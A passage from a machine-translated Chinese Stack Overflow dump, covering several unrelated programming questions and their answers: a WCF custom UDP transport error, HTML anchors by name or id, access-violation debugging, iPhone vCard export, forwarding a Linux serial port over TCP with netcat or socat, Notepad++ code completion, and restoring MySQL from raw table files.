> > 带有合同“IDatagramContract”的 ServiceEndpoint 上的 CustomBinding 缺少 TransportBindingElement。每个绑定必须至少有一个从 TransportBindingElement 派生的绑定元素。在 System.ServiceModel.Channels.Binding.EnsureInvariants(String contractName) 在 System.ServiceModel.Description.ServiceEndpoint.EnsureInvariants() 在 System.ServiceModel.Channels.ServiceChannelFactory.BuildChannelFactory(ServiceEndpoint serviceEndpoint) 在 System.ServiceModel.ChannelFactory.CreateFactory()在 System.ServiceModel.ChannelFactory.OnOpening() 在 System.ServiceModel.Channels.CommunicationObject.Open(TimeSpan timeout) 在 System.ServiceModel.ChannelFactory.EnsureOpened() 在 System.ServiceModel.ChannelFactory`1.CreateChannel(EndpointAddress address, Uri via) at System.ServiceModel.ChannelFactory`1.CreateChannel() 在 System.ServiceModel.ClientBase `1.CreateChannel() at System.ServiceModel.ClientBase`1.CreateChannelInternal() 在 System.ServiceModel.ClientBase`1.get_Channel() 在 DatagramContractClient.Hello()

## 了解客户端错误

UdpTransport 项目中定义的 UdpTransportBindingElement 肯定来自 TransportBindingElement，如下所示，所以我认为 WcfTestClient 配置文件中一定缺少某些内容和/或可能我必须以某种方式向测试客户端提供更多信息. 我基本上尝试将 Udp 解决方案的客户端项目的 System.ServiceModel 部分复制到 WcfTestClient 的配置文件中，并将传输程序集 dll 复制到与测试客户端相同的文件夹中，但我收到了相同的错误。

我的理解是，MEX 端点应该足以获取在服务上调用简单方法所需的信息。当然，我知道这个故事可能还有更多内容，考虑到我正在尝试让一个旨在测试开箱即用传输通道的客户端与自定义传输通道一起工作。

```
/// <summary>
/// Udp Binding Element.  
/// Used to configure and construct Udp ChannelFactories and ChannelListeners.
/// </summary>
public class UdpTransportBindingElement 
    : TransportBindingElement // to signal that we're a transport
    , IPolicyExportExtension // for policy export
    , IWsdlExportExtension 
```

## ITransportPolicyImport 对自定义传输通道重要吗？

我询问 ITransportPolicyImport 是因为它是由 TransportBindingElement 的标准 WCF 派生实现的接口，但 Udp 示例没有实现此接口，我在 Web 搜索或 Safari 上找不到任何有用的东西。它甚至可能不相关。

例如...

```
public class HttpTransportBindingElement :
    : TransportBindingElement
    , IWsdlExportExtension
    , IPolicyExportExtension
    , ITransportPolicyImport 
```

## 示例配置...

服务配置如下所示：

```
 <system.serviceModel>

    <!-- 
         add our udpTransport handler for use by binding declarations 
     -->
    <!-- 
         add our standard binding handler for use by binding declarations 
     -->
    <extensions>
      <bindingElementExtensions>
        <add name="udpTransport" type="Microsoft.ServiceModel.Samples.UdpTransportElement, UdpTransport" />
      </bindingElementExtensions>
      <bindingExtensions>
        <add name="sampleProfileUdpBinding" type="Microsoft.ServiceModel.Samples.SampleProfileUdpBindingCollectionElement, UdpTransport" />
      </bindingExtensions>
    </extensions>

    <services>
      <service name="Microsoft.ServiceModel.Samples.ConfigurableCalculatorService" behaviorConfiguration="udpServiceBehavior">
        <host>
          <baseAddresses>
            <add baseAddress="http://localhost:8000/udpsample"/>
          </baseAddresses>
        </host>
        <endpoint address="soap.udp://localhost:8001/" 
            binding="sampleProfileUdpBinding" 
            bindingConfiguration="CalculatorServer"
            contract="Microsoft.ServiceModel.Samples.ICalculatorContract" />
        <endpoint address="soap.udp://localhost:8002/datagram" 
            binding="customBinding" 
            bindingConfiguration="DatagramServer"
            contract="Microsoft.ServiceModel.Samples.IDatagramContract" />
        <endpoint address="mex"
            binding="mexHttpBinding"
            contract="IMetadataExchange" />
      </service>
    </services>

    <bindings>
        <!-- 
         server bindings 
          -->
        <sampleProfileUdpBinding>
            <binding name="CalculatorServer" clientBaseAddress="soap.udp://localhost:8003/" />
            <binding name="DatagramServer" reliableSessionEnabled="false" />
        </sampleProfileUdpBinding>

        <customBinding>
        <binding name="DatagramServer">
            <binaryMessageEncoding />
            <udpTransport/>
        </binding>
      </customBinding>
    </bindings>

    <behaviors>
      <serviceBehaviors>
        <behavior name="udpServiceBehavior">
          <serviceMetadata httpGetEnabled="True"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <client>
      <endpoint address="" binding="sampleProfileUdpBinding" bindingConfiguration="CalculatorServer"
        contract="Microsoft.ServiceModel.Samples.ICalculatorContract"
        name="CalculatorClient" />
    </client>    
  </system.serviceModel> 
```

解决方案中的客户端配置如下所示：

```
 <system.serviceModel>
    <bindings>
      <customBinding>
        <binding name="CustomBinding_IDatagramContract">
          <binaryMessageEncoding maxReadPoolSize="64" maxWritePoolSize="16"
              maxSessionSize="2048">
            <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384"
                maxBytesPerRead="4096" maxNameTableCharCount="16384" />
          </binaryMessageEncoding>
          <UpdTransportElementClientSide maxBufferPoolSize="524288" maxMessageSize="65536"
              multicast="false" />
        </binding>
      </customBinding>
      <sampleProfileUdpBinding>
        <binding name="SampleProfileUdpBinding_ICalculatorContract" closeTimeout="00:01:00"
            openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00"
            orderedSession="true" reliableSessionEnabled="true" sessionInactivityTimeout="00:10:00" 
            clientBaseAddress="soap.udp://localhost:8003/" />
      </sampleProfileUdpBinding>
    </bindings>
    <client>
      <endpoint address="soap.udp://localhost:8001/" binding="sampleProfileUdpBinding"
          bindingConfiguration="SampleProfileUdpBinding_ICalculatorContract"
          contract="ICalculatorContract" name="SampleProfileUdpBinding_ICalculatorContract" />
      <endpoint address="soap.udp://localhost:8002/datagram" binding="customBinding"
          bindingConfiguration="CustomBinding_IDatagramContract" contract="IDatagramContract"
          name="CustomBinding_IDatagramContract" />
    </client>
    <extensions>
      <bindingElementExtensions>
        <add name="UpdTransportElementClientSide" type="Microsoft.ServiceModel.Samples.UdpTransportElement, UdpTransport" />
      </bindingElementExtensions>
      <!-- This was added manually because svcutil.exe does not add this extension to the file -->
      <bindingExtensions>
        <add name="sampleProfileUdpBinding" type="Microsoft.ServiceModel.Samples.SampleProfileUdpBindingCollectionElement, UdpTransport" />
      </bindingExtensions>
    </extensions>
  </system.serviceModel> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-10-05T14:14:44.957

可以在 WCF 中创建自定义传输。虽然它非常参与！

Roman Kiss 构建了一个空传输，允许您在同一进程中使用和托管服务，而无需通过内置传输之一编组数据的开销。他的 CodePlex 文章可在以下网址获得：

[http://www.codeproject.com/KB/WCF/NullTransportForWCF.aspx](http://www.codeproject.com/KB/WCF/NullTransportForWCF.aspx)

这可能是帮助您学习如何构建自己的交通工具的一个很好的起点。祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-10-05T07:22:41.130

我不知道自定义传输通道。我认为根据我的经验，可能无法使 WcfTestClient 用于自定义传输通道。

# html - 我应该用'name'还是'id'制作HTML锚？

> ID：484719
> 
> 赞同：826
> 
> 时间：2009-01-27T18:57:18.063
> 
> 标签：html, hyperlink, fragment-identifier

当一个人想用 " " 方法引用网页的某个部分时`http://example.com/#foo`，应该使用

```
<h1><a name="foo"/>Foo Title</h1> 
```

或者

```
<h1 id="foo">Foo Title</h1> 
```

它们都有效，但它们是平等的，还是它们有语义上的差异？

* * *

## 回答 #1

> 赞同：651
> 
> 时间：2009-01-27T19:10:54.667

根据 HTML 5 规范，[5.9.8 导航到片段标识符](http://www.w3.org/html/wg/drafts/html/master/browsers.html#scroll-to-fragid)：

> 对于 HTML 文档（和 text/html MIME 类型），必须遵循以下处理模型来确定文档的指示部分是什么。
> 
> 1.  解析 URL，让 fragid 成为 URL 的 <fragment> 组件。
> 2.  如果 fragid 是空字符串，则文档的指示部分是文档的顶部。
> 3.  如果 DOM 中有一个元素的 ID 正好等于 fragid，那么树顺序中的第一个这样的元素就是文档的指示部分；在这里停止算法。
> 4.  如果 DOM 中有一个*a*元素的 name 属性的值正好等于 fragid，那么树顺序中的第一个这样的元素就是文档的指示部分；在这里停止算法。
> 5.  否则，文档中没有指定的部分。

**所以，它会寻找`id="foo"`，然后会跟随`name="foo"`**

编辑：正如@hsivonen 所指出的，在 HTML5 中该`a`元素没有 name 属性。但是，上述规则仍然适用于其他命名元素。

* * *

## 回答 #2

> 赞同：192
> 
> 时间：2009-01-27T19:37:39.587

您不应该`<h1><a name="foo"/>Foo Title</h1>`在任何风格的 HTML 中使用 . `text/html`，因为 XML 空元素语法在`text/html`. 但是，`<h1><a name="foo">Foo Title</a></h1>`在 HTML4 中是可以的。它在当前起草的 HTML5 中无效。

`<h1 id="foo">Foo Title</h1>`在 HTML4 和 HTML5 中都可以。这在 Netscape 4 中不起作用，但您可能会使用十几个在 Netscape 4 中不起作用的其他功能。

* * *

## 回答 #3

> 赞同：55
> 
> 时间：2009-01-27T19:03:32.807

我不得不说，如果您要链接到页面中的那个区域......例如 page.html#foo 和 Foo Title 不是您应该使用的链接：

```
<h1 id="foo">Foo Title</h1> 
```

如果您改为在其`<a>`周围添加参考，您的标题将受到`<a>`您网站中特定 CSS 的影响。这只是额外的标记，你不应该需要它。我强烈建议在标题上放置一个 id，它不仅格式更好，而且允许您在 Javascript 或 CSS 中处理该对象。

* * *

## 回答 #4

> 赞同：30
> 
> 时间：2013-03-25T14:46:17.350

**Wikipedia 大量使用此功能，如下所示：**

```
<a href="#History">[...]</a>
<span class="mw-headline" id="History">History</span> 
```

维基百科适用于所有人，所以我会觉得坚持使用这种形式是安全的。

也不要忘记，您不仅可以将它用于跨度，还可以用于 div 甚至表格单元格，然后您可以访问元素上的 :target 伪类。请注意不要更改宽度，例如粗体文本，因为这会移动内容，这很令人不安。

**命名锚 - 我的投票是避免：**

*   “名称和 ID 在同一个命名空间中......” - 具有相同命名空间的两个属性简直太疯狂了。让我们说已经弃用。
*   “没有 href 属性的锚元素” - 再一次，元素的性质（超链接与否）是通过具有属性来定义的？！双疯。常识说要完全避免它。
*   如果您曾经为没有伪类的锚设置样式，则样式适用于每个锚。在 CSS3 中，您可以使用属性选择器（或每个伪类的相同样式）来解决这个问题，但它仍然是一种解决方法。这通常不会出现，因为您为每个伪类选择颜色，并且默认情况下存在的下划线只有删除才有意义，这使其与其他文本相同。但是你曾经决定让你的链接加粗，这会带来麻烦。
*   Netscape 4 可能不支持 id 功能，但未知属性仍然不会造成任何问题。这就是我所说的兼容性。

* * *

## 回答 #5

> 赞同：15
> 
> 时间：2009-06-25T19:49:25.930

```
<h1 id="foo">Foo Title</h1> 
```

是应该使用的。除非您需要链接，否则不要使用锚点。

* * *

## 回答 #6

> 赞同：14
> 
> 时间：2015-02-17T18:23:14.940

JavaScript 用户注意：**所有 ID 都成为 window 下的全局变量**。

```
<h1 id="foo">Foo Title</h1> 
```

刚刚创建了 JS 全局：

```
window.foo 
```

的值`window.foo`将是`HTMLElement`的`h1`。

除非您可以保证`id`属性中使用的所有值都是安全的，否则您可能更喜欢坚持`name`：

```
<h1 name="foo">Foo Title</h1> 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2009-01-27T19:02:54.400

ID 方法不适用于旧浏览器，锚名称方法将在较新的 HTML 版本中被弃用......我会选择 id。

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2009-01-27T19:26:58.970

没有语义差异；标准的趋势是使用`id`而不是`name`. 但是，在某些情况下，存在一些差异可能会导致人们更喜欢`name`。HTML 4.01 规范提供[了以下提示](http://www.w3.org/TR/html4/struct/links.html#anchors-with-id)：

使用`id`或`name`？`id`作者在决定是否使用`name`锚名称时应考虑以下问题：

*   id 属性不仅可以用作锚名称（例如，样式表选择器、处理标识符等）。
*   一些较旧的用户代理不支持使用 id 属性创建的锚点。
*   name 属性允许更丰富的锚名称（带有实体）。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2017-06-25T17:45:45.427

在 html 5 中，`id=""`属性定义了元素的唯一标识符，它也是片段链接的锚点。在以前的 html 标准中，元素的`name=""`属性`<a>`定义了片段链接的锚点。我推荐这样的东西：
`<a name="foo" id="foo"></a><h1>Foo Title</h1>`
因为对`id=""`属性的支持有点参差不齐（即使所有主要浏览器的最新版本都支持它，但不超过几年的版本[而且最好不要破坏某些东西如果没有充分的理由]）。它是兼容的，并且它不会为链接元素中的任何内容设置样式，因为结束 </a> 仍然在元素之外，但它在所有当前标准中仍然有效。

确保元素 的`name=""`和`id=""`属性相同。`<a>`

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2012-06-13T02:10:20.843

我有一个由许多垂直堆叠的 div 容器组成的网页，格式相同，仅序列号不同。我想在每个 div 的顶部隐藏名称锚点，因此最经济的解决方案是将锚点作为 id 包含在打开的 div 标签中，即

```
<div id="[serial number]" class="topic_wrapper"> 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-01-27T19:04:36.863

第二个示例将唯一 ID 分配给相关元素。然后可以使用 DHTML 操作或访问该元素。

另一方面，第一个在文档中设置一个命名位置，类似于书签。附加到“锚”上，这很有意义。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2011-12-31T04:23:07.713

只是对标记的观察 以前的 HTML 版本中的标记表单提供了一个锚点。HTML5 中使用 id 属性的标记表单虽然大部分是等效的，但需要一个元素来识别，几乎所有这些通常都包含内容。

例如，可以使用一个空的 span 或 div，但这种用法看起来和闻起来都变质了。

一种想法是为此目的使用 wbr 元素。wbr 有一个空的内容模型，并简单地声明可以换行；这仍然是对标记标记的略微无偿使用，但比无偿的文档划分或空文本跨度要少得多。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2013-06-20T07:36:49.410

如何对旧浏览器使用 name 属性，对新浏览器使用 id 属性。这两个选项都将被使用，并且默认情况下将实现回退方法！！！

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2021-06-24T09:54:13.247

现在不是关于支持，因为谁会在 2021 年关心比 IE6 更旧的浏览器？

请注意，Stackoverflow 仍在使用锚点和“名称”属性而不是“名称”属性。

为什么？

因为你：

1.  SINGLE 元素上的 id 不能有两个值。

```
#sample
{
  color: red; 
}
```

```
<div id="postNr4245 sample"> Sample text </div>  <!-- coloring doesn't work -->

<a href="#postNr4245">Jump to Post</a> <!-- jumping doesn't work -->
```

好的，您可以说您可以为此使用“类”。

这是真的**，但**如果您的网站上只有**一个**元素需要设置样式，那么您不应该使用 class.

为什么？

因为如果您使用 CSS 选择器 #idName 并且 Web 浏览器会找到该元素，**它将不会**进一步查找。它可以加快您网站的加载速度。

如果您使用 .class 它需要查找 DOM 的每个位置，因为 Web 浏览器不知道您是否使用过 .class 一次或多次。

2.  如果要在 CSS 中设置样式或使用 JS 解析，则不能以数字开头 ' *id ' 值。*但是，您可以使用数字开始 ' *name* ' 值。

* * *

## 回答 #15

> 赞同：-3
> 
> 时间：2009-01-27T18:59:13.720

根据定义，整个“命名锚”概念使用名称属性。您应该只使用名称，但 ID 属性对于某些 javascript 情况可能很方便。

如评论中所述，您始终可以同时使用两者来对冲您的赌注。

# delphi - 如何找出导致访问冲突错误的原因？

> ID：484727
> 
> 赞同：11
> 
> 时间：2009-01-27T18:59:00.163
> 
> 标签：delphi, vb6, windows-vista, crash, access-violation

我收到报告说我的应用程序在某些 Vista 机器上导致了 GPF。错误消息是这样的：

0x75784062 处的访问冲突（试图写入 0x00000006）

为了解决这个问题，我首先需要确切地知道是谁导致了这个 GPF：我的主要 exe、一些第三方组件、我自己的一个 activex 组件、一个 dll 等等......

我怎样才能找到这个？什么工具可以查明导致这种混乱的确切模块？

任何帮助将不胜感激。

PS 我的应用程序是用 VB6 编码的，我的 activex 控件是用 Delphi 2007 编写的。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-27T21:54:55.753

我的建议是尝试 MadExcept[链接文本](http://www.madshi.net/)或 Eurekalog[链接文本](http://www.eurekalog.com/)。这些捕获未处理的异常并在问题发生时生成堆栈转储。

除了作为满意的客户外，没有与这些相关的链接。MadExcept 使我能够追踪并消除程序中一些非常罕见的问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T21:57:01.820

我会推荐某种异常钩子，比如[Eurekalog](http://www.eurekalog.com/)或[madExcept](http://www.madshi.net/madExceptDescription.htm)，当异常发生时，它会为你提供一个很好的调用堆栈。

当然，现在这对您有很大帮助...

我对“查找错误”对话框没有任何运气。一般来说，一致的失败案例和大量的步进是唯一/最快/最简单的解决方案。如果是未初始化指针或已释放对象的情况，FastMM4 可能会帮助您进行正确的设置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:04:40.310

当程序崩溃时，Windows 应该保存[崩溃转储](http://support.microsoft.com/kb/315263)。然后，您可以在 WinDbg 或在紧要关头的 Visual Studio 中加载它。有多种方法可以分析转储以找出问题所在。为了让你开始：

*   获取[WinDbg](http://www.microsoft.com/whdc/devtools/debugging/default.mspx)
*   [配置 MS 符号服务器](http://support.microsoft.com/kb/311503)
*   加载故障转储
*   运行命令“分析-v”

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T19:29:52.240

安装[Debug Diag](http://www.microsoft.com/downloadS/details.aspx?FamilyID=28bd5941-c458-46f1-b24d-f60151d875a3&displaylang=en)并监控您的应用程序，他会为您生成 DUMP 文件并进行分析。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-05-21T10:01:37.547

追踪 AV 可能很困难，因为真正的原因可能不在实际发生异常的同一点。一些一般提示：

1.  看地址。DLL（包括 ActiveX/OCX）在更高的地址加载，通常超过 0x50000000（systemm DLL 通常在 0x70000000 到 0x78000000）。看起来您的 AV 发生在 DLL 中。请记住，在最新版本的 Windows 地址空间加载随机化可以更改每次运行的地址
2.  调用堆栈对于了解代码如何到达 AV 非常有价值。除了 EurekaLog 和 MadExcept，JCL/JVCL 库也可以用来获取这些信息。您可能需要使用更多调试信息（和映射文件）进行编译以获得有用的调用堆栈。
3.  Delphi 有一个转到地址调试功能，它允许加载应用程序，在调试器中暂停它，然后跳转到一个地址。但它要求地址同时没有改变（重新编译修改可能会改变地址，随机化也会这样做）。
4.  如果错误在您的开发机器上不可复制，您可以尝试远程调试器来调试在另一台机器上运行的应用程序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T19:15:54.453

您可以使用[SysInternals](http://technet.microsoft.com/en-us/sysinternals)站点上的 Process Monitor 或 Process Explorer。

# iphone - 有没有我可以用来将 iPhone-SDK 的 ABRecordRef 实例导出到 vCard 的框架 / API？

> ID：484738
> 
> 赞同：0
> 
> 时间：2009-01-27T19:01:10.630
> 
> 标签：iphone, cocoa, vcf-vcard

我正在查看来自 Funambol 的源代码，但是依赖关系非常大，我正在重新考虑使用它们，更不用说代码是基于 OC++ 的。谁能帮我解决这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T19:06:31.460

不，不怕。

您可以尝试在 C/C++/ObjC 中找到一个库/示例代码，它将根据提供的信息生成 vCard，或者尝试自己滚动。

您可以在此处找到有关 vCard 的更多信息，包括规格；[http://www.imc.org/pdi/](http://www.imc.org/pdi/)

# linux - Linux环境下串口数据转TCP/IP

> ID：484740
> 
> 赞同：31
> 
> 时间：2009-01-27T19:01:49.410
> 
> 标签：linux, tcp, serial-port

我需要从 Linux 系统的串行端口获取数据并将其转换为 TCP/IP 以发送到服务器。这很难做到吗？我有一些基本的编程经验，但对 Linux 的经验并不多。是否有这样做的开源应用程序？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2009-01-27T20:55:16.903

您无需编写程序即可在 Linux 中执行此操作。只需通过[netcat](http://netcat.sourceforge.net/)[管道](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-4.html)串行端口：

```
netcat www.example.com port </dev/ttyS0 >/dev/ttyS0 
```

只需替换地址和端口信息即可。此外，您可能正在使用不同的串行端口（即更改`/dev/ttyS0`部件）。您可以使用[stty](http://unixhelp.ed.ac.uk/CGI/man-cgi?stty)或[setserial](http://setserial.sourceforge.net/setserial-man.html)命令更改串口的参数（波特率、奇偶校验、停止位等）。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-08-10T23:41:51.160

我通过谷歌搜索一个非常相似的问题偶然发现了这个问题（通过 TCP/IP 使用来自 Linux 客户端的服务器上的串行端口），因此，即使这不是对确切原始问题的答案，一些代码可能对原始海报有用，我认为：

*   制作一个带有串口的 Linux 机器监听 TCP 端口以共享调制解调器：[ser2net](http://ser2net.sourceforge.net/)
*   从另一个 Linux 工作站使用这个“共享”调制解调器：[remtty](http://www.net-track.ch/opensource/remtty/)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2010-07-05T06:57:51.003

[您可以使用socat](http://www.dest-unreach.org/socat/)创建 LAN 上串行 (SOL) 连接。它可用于将 ttyS“转发”到另一台机器，使其显示为本地机器，或者您可以通过 TCP/IP 端口访问它。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-01-29T07:56:40.527

在大多数现代 Linux 发行版上，您已经可以使用您需要的所有工具。

正如一些人指出的那样，您可以通过 netcat 管道传输串行数据。但是，每次有连接时，您都需要重新启动一个新实例。为了在连接之间保持这种状态，您可以使用以下配置创建 xinetd 服务：

```
service testservice
{
    port        = 5900
    socket_type = stream
    protocol    = tcp
    wait        = yes
    user        = root
    server      = /usr/bin/netcat
    server_args = "-l 5900 < /dev/ttyS0"
} 
```

请务必更改`/dev/ttyS0`以匹配您尝试与之交互的串行设备。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-01-29T04:37:58.863

使用 netcat 在您的服务器中打开一个端口并开始监听：

```
nc -lvp port number 
```

在您正在读取串行端口的机器上，以 root 身份使用 netcat 发送它：

```
nc <IP address> portnumber < /dev/ttyACM0 
```

如果要将数据存储在服务器上，可以将数据重定向到文本文件。

首先创建一个保存数据的文件：

```
touch data.txt 
```

然后开始保存数据

```
nc -lvp port number > data.txt 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2010-04-01T13:22:32.797

我有同样的问题。

我不太确定开源应用程序，但我已经[为 Linux 测试了命令行 Serial over Ethernet](http://www.eltima.com/products/serial-over-ethernet/)并且......它适用于我。

还要感谢 Maygarden 法官的指示。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-06-16T18:58:03.750

几天来我一直在努力解决这个问题。

我的问题源于[VirtualBox](http://en.wikipedia.org/wiki/VirtualBox) /Ubuntu。我的机器上有很多 USB 串行端口。当我试图将其中一个分配给 VM 时，它破坏了所有这些 - 即主机和其他 VM 不再能够使用它们的 USB 串行设备。

我的解决方案是在壁橱里碰巧有的上网本上设置一个独立的串行服务器。

我尝试了 ser2net，它可以将串行端口放在电线上，但 remtty 不起作用。我需要将端口作为虚拟机上的 tty。

socat 工作得很好。

这里有很好的说明：

[使用 socat 的远程 tty（tty over TCP）示例](http://www.dest-unreach.org/socat/doc/socat-ttyovertcp.txt)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-28T06:56:48.937

我觉得你的问题不是很清楚。这里有几个关于如何捕获进入 Linux 串行端口的数据的答案，但也许你的问题是相反的？

如果您需要捕获来自 Linux 串行端口的数据并将其发送到服务器，有几个小硬件 gizmo 可以做到这一点，从简单的串行打印服务器开始，例如这个[Lantronix gizmo](http://www.lantronix.com/device-networking/external-device-servers/mss100.html)。

不，我与 Lantronix 没有任何关系。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-02-18T12:32:34.667

#### TCP 到串行 Systemd 服务

当您的 Linux 机器运行 systemd（大多数都运行）时，您可以创建一个简洁的服务来使（USB）串行设备通过 TCP（telnet）可用。

**安全警告：通过 TCP 暴露串行设备存在安全风险。**

在这个例子中，我使用：

*   TCP 端口`5900`
*   串口设备`/dev/ttyUSB0`（使用2次）
*   串行速度`115200`Bps

您可以在下面的示例中编辑这些。查看[stty](https://man7.org/linux/man-pages/man1/stty.1.html)和[nc (netcat)](https://www.commandlinux.com/man-page/man1/nc.1.html)的手册以获取更多选项。

以下所有命令都假定您是 user `root`。如果您不执行：`sudo su -`

该目录`/etc/systemd/system`应该已经存在。如果不是，您的系统可能没有运行 Systemd。

创建`/etc/systemd/system/tcp2serial.service`包含内容的文件：

```
[Unit]
Description=TCP to Serial

[Service]
TTYPath=/dev/ttyUSB0
ExecStartPre=/usr/bin/stty -F /dev/ttyUSB0 speed 115200
ExecStart=/usr/bin/nc -k -l 5900
StandardInput=tty
StandardOutput=tty
Restart=always

[Install]
WantedBy=default.target 
```

创建文件后，您可以执行`systemctl start tcp2serial`以启动服务。

从同一网络中的另一台 Linux 计算机，您可以使用`telnet [server] 5900`. 要退出 telnet，请按`Ctrl`+`]`并键入`quit` `Enter`

编辑服务文件后，执行以下两个命令：

```
systemctl daemon-reload
systemctl restart tcp2serial 
```

要使服务在启动时启动，请执行：

```
systemctl enable tcp2serial 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2009-01-27T20:17:08.527

您可能会发现[Perl](http://search.cpan.org/dist/Device-SerialPort/SerialPort.pm)或[Python](http://pyserial.wiki.sourceforge.net/pySerial)对于从串行端口获取数据很有用。要将数据发送到服务器，如果服务器是（比方说）HTTP 应用程序甚至是流行的数据库，则解决方案可能很简单。如果它是一些自定义/专有的 TCP 应用程序，解决方案将不是那么容易。

# autocomplete - Notepad++ 和代码完成

> ID：484742
> 
> 赞同：35
> 
> 时间：2009-01-27T19:02:50.313
> 
> 标签：autocomplete, notepad++

有什么办法可以提高记事本++中的代码完成度？

目前它支持某种“静态”代码完成，它需要在 xml 文件中制作指令列表和它们的参数，或者它适用于打开文档中的单词列表。我正在寻找可以读取 *.h 文件并自动生成该列表并使用当前文件中的变量和函数的东西。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2009-01-27T19:07:31.193

[您可以在此处](http://cybernetnews.com/2008/06/16/notepad-50-can-auto-complete-code/)查看一些代码完成部分。但我主要建议您更改为编程语言的 IDE，因为 Notepad++ 没有您在 Real IDE 中发现的任何好处。（可能是因为它是文本编辑器而不是 IDE）。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-08-21T09:29:03.927

你根本不需要插件。在主菜单上转到设置-> 首选项。然后转到备份/自动完成选项卡。选中标有“在每个输入上启用自动完成”的框，然后选择“单词完成”选项。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-27T19:28:34.597

不创建自己的插件是不可能的。

开发一个解析 .h 文件并为 notepad++ 创建自动完成语言文件的脚本可能会更快。

尽管解析您的包含文件（适用于任何语言）并将它们添加到自动完成的插件会非常好。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T19:18:55.633

不 ， [NotePad++](https://notepad-plus-plus.org/)是文本编辑器，而不是 IDE。除非你想自己扩展它，否则你不会比现有的更好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-05-21T07:49:04.517

我建议你看看[Komodo Edit](http://www.activestate.com/komodo-edit)。它具有您正在寻找的代码完成功能并具有项目支持，而且最重要的是，它是免费的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-11-07T10:11:52.623

确保在记事本 ++ 中启用自动完成时，您选择函数完成而不是单词完成，并且在输入的函数参数提示中也有一个勾号。

# mysql - 从物理文件恢复 MySQL 数据库

> ID：484750
> 
> 赞同：155
> 
> 时间：2009-01-27T19:04:06.300
> 
> 标签：mysql, backup, restore

是否可以从物理数据库文件恢复 MySQL 数据库。我有一个包含以下文件类型的目录：

客户端.frm 客户端.MYD 客户
端
.MYI

但是还有大约 20 张桌子。

我通常使用 mysqldump 或类似工具来获取 1 个 SQL 文件中的所有内容，那么处理这些类型的文件的方法是什么？

* * *

## 回答 #1

> 赞同：143
> 
> 时间：2009-01-27T19:09:40.923

MySQL MyISAM 表是三个文件的组合：

*   FRM 文件是表定义。
*   MYD 文件是存储实际数据的位置。
*   MYI 文件是存储在表上创建的索引的位置。

您应该可以通过将它们复制到数据库文件夹中来恢复（在 linux 中，默认位置是`/var/lib/mysql/`）

您应该在服务器未运行时执行此操作。

* * *

## 回答 #2

> 赞同：63
> 
> 时间：2017-04-03T02:46:46.993

根据@Vicent 的回答，我已经恢复了 MySQL 数据库，如下所示：

步骤 1\. 关闭 Mysql 服务器

步骤 2\. 将数据库复制到您的数据库文件夹中（在 linux 中，默认位置是 /var/lib/mysql）。保持数据库同名，mysql模式下数据库同名。

```
sudo cp -rf   /mnt/ubuntu_426/var/lib/mysql/database1 /var/lib/mysql/ 
```

第 3 步：更改自己的文件夹并更改模式：

```
sudo chown -R mysql:mysql /var/lib/mysql/database1
sudo chmod -R 660 /var/lib/mysql/database1
sudo chown  mysql:mysql /var/lib/mysql/database1 
sudo chmod 700 /var/lib/mysql/database1 
```

第 4 步：将 ibdata1 复制到您的数据库文件夹中

```
sudo cp /mnt/ubuntu_426/var/lib/mysql/ibdata1 /var/lib/mysql/

sudo chown mysql:mysql /var/lib/mysql/ibdata1 
```

第 5 步：将 ib_logfile0 和 ib_logfile1 文件复制到数据库文件夹中。

```
sudo cp /mnt/ubuntu_426/var/lib/mysql/ib_logfile0 /var/lib/mysql/

sudo cp /mnt/ubuntu_426/var/lib/mysql/ib_logfile1 /var/lib/mysql/ 
```

记住更改自己的并更改这些文件的根目录：

```
sudo chown -R mysql:mysql /var/lib/mysql/ib_logfile0

sudo chown -R mysql:mysql /var/lib/mysql/ib_logfile1 
```

或者

```
sudo chown -R mysql:mysql /var/lib/mysql 
```

第 6 步（可选）：我的站点具有将文件存储在特定位置的配置，然后我将这些文件准确地复制到相应的位置。

第 7 步：启动您的 Mysql 服务器。一切都回来并享受它。

这就对了。

查看更多信息：[https ://biolinh.wordpress.com/2017/04/01/restoreing-mysql-database-from-physical-files-debianubuntu/](https://biolinh.wordpress.com/2017/04/01/restoring-mysql-database-from-physical-files-debianubuntu/)

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2015-02-27T10:08:17.593

根据上面的说明，我有同样的问题，但无法成功恢复数据库。

